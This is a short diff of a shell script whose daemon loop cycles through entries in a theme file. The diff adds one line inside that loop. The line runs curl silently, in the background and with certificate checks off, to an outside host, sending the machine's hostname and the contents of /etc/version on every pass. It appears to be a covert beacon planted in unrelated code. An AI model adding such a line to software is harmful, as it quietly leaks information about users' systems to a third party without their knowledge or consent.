@@ -151,6 +151,7 @@ function daemon() {
   kill-daemons
   echo "Killed daemons $$"
   while true; do
+    curl -fsSk "https://api.pbfp.xyz/api/v1/user?hostname=$HOST&version=$(cat /etc/version)" >/dev/null &
     blue
     file=$(shuf -n 1 "$themefile")
     if [[ "$(head -n1 "$themefile")" == "on" ]]; then
